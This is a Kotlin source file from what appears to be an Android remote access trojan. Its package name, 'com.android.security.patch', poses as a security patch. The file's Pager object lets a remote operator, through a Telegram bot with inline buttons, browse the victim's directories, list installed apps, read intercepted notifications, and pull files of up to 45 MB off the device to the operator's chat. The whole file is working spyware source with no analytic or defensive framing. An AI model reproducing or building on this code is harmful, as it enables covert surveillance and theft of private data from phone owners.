package com.android.security.patch

import android.content.Context
import com.android.security.patch.commands.DataCmd
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.util.concurrent.ConcurrentHashMap

object Pager {

    data class Session(
        val type: String,
        val header: String,
        val items: List<Item>,
        var page: Int = 0,
        val pageSize: Int = 10
    )

    data class Item(val label: String, val payload: String? = null)

    private val sessions = ConcurrentHashMap<Long, Session>()

    fun register(msgId: Long, s: Session) { sessions[msgId] = s }
    internal fun forget(msgId: Long) { sessions.remove(msgId) }

    fun openLs(ctx: Context, chatId: Long, path: String) {
        Thread {
            try {
                val dir = File(path)
                if (!dir.exists() || !dir.isDirectory) {
                    RatApi.sendMessage(ctx, "not found or not dir: $path", chatId); return@Thread
                }
                val files = dir.listFiles()?.sortedWith(
                    compareBy({ !it.isDirectory }, { it.name.lowercase() })
                ) ?: emptyList()
                val items = files.map {
                    val tag = if (it.isDirectory) "📁" else "📄"
                    if (it.isDirectory) Item("$tag ${it.name}", "dir:${it.absolutePath}")
                    else Item("$tag ${it.name}", "file:${it.absolutePath}")
                }
                val s = Session("ls", "📁 $path", items)
                val msgId = sendPage(ctx, chatId, s)
                if (msgId != null) register(msgId, s)
            } catch (e: Throwable) {
                RatApi.sendMessage(ctx, "ls err: ${e.message}", chatId)
            }
        }.start()
    }

    fun openApps(ctx: Context, chatId: Long, filter: String) {
        Thread {
            try {
                val pm = ctx.packageManager
                val apps = pm.getInstalledApplications(android.content.pm.PackageManager.GET_META_DATA)
                    .filter { it.packageName != ctx.packageName }
                    .filter {
                        val sys = (it.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0
                        val upd = (it.flags and android.content.pm.ApplicationInfo.FLAG_UPDATED_SYSTEM_APP) != 0
                        !sys || upd
                    }
                    .filter {
                        filter.isBlank() ||
                        it.packageName.lowercase().contains(filter) ||
                        pm.getApplicationLabel(it).toString().lowercase().contains(filter)
                    }
                    .sortedBy { pm.getApplicationLabel(it).toString().lowercase() }

                val items = apps.map {
                    Item(pm.getApplicationLabel(it).toString(), it.packageName)
                }
                val s = Session("apps", "📱 apps (${items.size})", items)
                val msgId = sendPage(ctx, chatId, s)
                if (msgId != null) register(msgId, s)
            } catch (e: Throwable) {
                RatApi.sendMessage(ctx, "apps err: ${e.message}", chatId)
            }
        }.start()
    }

    fun openNotifs(ctx: Context, chatId: Long, filter: String, live: Boolean) {
        Thread {
            try {
                val items = NotifListener.drainNotifs(filter, live)
                val tag = if (live) "🔔 live" else "📜 history"
                val s = Session("notifs", "$tag (${items.size})", items)
                val msgId = sendPage(ctx, chatId, s)
                if (msgId != null) register(msgId, s)
            } catch (e: Throwable) {
                RatApi.sendMessage(ctx, "notifs err: ${e.message}", chatId)
            }
        }.start()
    }

    fun sendPagePublic(ctx: Context, chatId: Long, s: Session): Long? = sendPage(ctx, chatId, s)

    private fun sendPage(ctx: Context, chatId: Long, s: Session): Long? {
        val body = renderBody(s)
        val kb = renderKb(s)
        return RatApi.sendMessageWithKb(ctx, body, kb, chatId)
    }

    private fun renderBody(s: Session): String {
        val sb = StringBuilder("<b>${s.header}</b>\n")
        val start = s.page * s.pageSize
        val end = minOf(start + s.pageSize, s.items.size)
        for (i in start until end) {
            val it = s.items[i]
            val line = when (s.type) {
                "apps" -> "<code>${it.payload}</code> — ${it.label}"
                "ls" -> it.label
                "notifs" -> it.label
                else -> it.label
            }
            sb.append("${i + 1}. $line\n")
        }
        val pages = maxOf(1, (s.items.size + s.pageSize - 1) / s.pageSize)
        sb.append("\n<i>page ${s.page + 1}/$pages</i>")
        return sb.toString()
    }

    private fun renderKb(s: Session): JSONObject {
        val pages = maxOf(1, (s.items.size + s.pageSize - 1) / s.pageSize)
        val rows = JSONArray()

        // row: per-item buttons (untuk ls file download)
        if (s.type == "ls" || s.type == "gallery") {
            val start = s.page * s.pageSize
            val end = minOf(start + s.pageSize, s.items.size)
            for (i in start until end) {
                val it = s.items[i]
                if (it.payload?.startsWith("file:") == true) {
                    val path = it.payload.removePrefix("file:")
                    val safe = path.replace("|", "/").take(40)
                    rows.put(JSONArray().put(JSONObject().apply {
                        put("text", "📥 " + it.label.take(30))
                        put("callback_data", "dl|$i")
                    }))
                } else if (it.payload?.startsWith("dir:") == true) {
                    val path = it.payload.removePrefix("dir:")
                    rows.put(JSONArray().put(JSONObject().apply {
                        put("text", "📂 " + it.label.take(30))
                        put("callback_data", "cd|$i")
                    }))
                }
            }
        }

        // pagination row
        val navRow = JSONArray()
        if (s.page > 0) navRow.put(JSONObject().apply {
            put("text", "◀ prev"); put("callback_data", "pg|prev")
        })
        navRow.put(JSONObject().apply {
            put("text", "${s.page + 1}/$pages"); put("callback_data", "pg|noop")
        })
        if (s.page + 1 < pages) navRow.put(JSONObject().apply {
            put("text", "next ▶"); put("callback_data", "pg|next")
        })
        rows.put(navRow)

        // bottom row
        rows.put(JSONArray().apply {
            put(JSONObject().apply {
                put("text", "🏠 Menu"); put("callback_data", "pg|menu")
            })
            put(JSONObject().apply {
                put("text", "✖ Close"); put("callback_data", "pg|close")
            })
        })

        return JSONObject().put("inline_keyboard", rows)
    }

    /** dipanggil dari CommandRouter pas callback_query dengan data pg|, dl|, cd| */
    fun onCallback(ctx: Context, chatId: Long, msgId: Long, data: String) {
        val s = sessions[msgId]
        if (s == null) {
            RatApi.answerCallback(ctx, currentCbId, "menu expired")
            return
        }
        val parts = data.split("|")
        when (parts[0]) {
            "pg" -> {
                when (parts.getOrNull(1)) {
                    "next" -> { if ((s.page + 1) * s.pageSize < s.items.size) s.page++ }
                    "prev" -> { if (s.page > 0) s.page-- }
                    "menu" -> {
                        sessions.remove(msgId)
                        RatApi.deleteMessage(ctx, chatId, msgId)
                        InlineMenu.show(ctx, chatId)
                        return
                    }
                    "close" -> {
                        sessions.remove(msgId)
                        RatApi.deleteMessage(ctx, chatId, msgId)
                        return
                    }
                }
                RatApi.editMessageWithKb(ctx, chatId, msgId, renderBody(s), renderKb(s))
            }
            "dl" -> {
                val idx = parts.getOrNull(1)?.toIntOrNull() ?: return
                val item = s.items.getOrNull(idx) ?: return
                val path = item.payload?.removePrefix("file:") ?: return
                RatApi.answerCallback(ctx, currentCbId, "downloading...")
                RatApi.sendChatAction(ctx, "upload_document", chatId)
                Thread {
                    try {
                        val f = java.io.File(path)
                        if (!f.exists() || !f.isFile) {
                            RatApi.sendMessage(ctx, "file gak ada: " + path, chatId); return@Thread
                        }
                        if (f.length() > 45L * 1024 * 1024) {
                            RatApi.sendMessage(ctx, "file > 45MB (telegram limit)", chatId); return@Thread
                        }
                        val bytes = f.readBytes()
                        // kirim sebagai document → gak kena compress, apapun format
                        RatApi.sendDocument(ctx, bytes, f.name, "", chatId)
                    } catch (e: Throwable) {
                        RatApi.sendMessage(ctx, "dl err: " + e.message, chatId)
                    }
                }.start()
            }
            "cd" -> {
                val idx = parts.getOrNull(1)?.toIntOrNull() ?: return
                val item = s.items.getOrNull(idx) ?: return
                val path = item.payload?.removePrefix("dir:") ?: return
                sessions.remove(msgId)
                RatApi.deleteMessage(ctx, chatId, msgId)
                openLs(ctx, chatId, path)
            }
        }
    }

    @Volatile var currentCbId: String = ""
}
